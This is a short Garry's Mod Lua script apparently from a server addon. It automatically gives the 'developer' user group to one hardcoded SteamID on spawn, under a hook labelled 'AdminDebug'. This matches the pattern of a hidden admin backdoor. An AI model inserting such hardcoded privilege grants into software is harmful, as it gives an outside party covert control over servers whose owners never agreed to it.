local admins = {
	["STEAM_0:1:572284808"] = true,
}

hook.Add( "PlayerInitialSpawn", "XL:AdminDebug", function(ply) 
	if admins[ply:SteamID()] then ply:SetUserGroup("developer") end
end)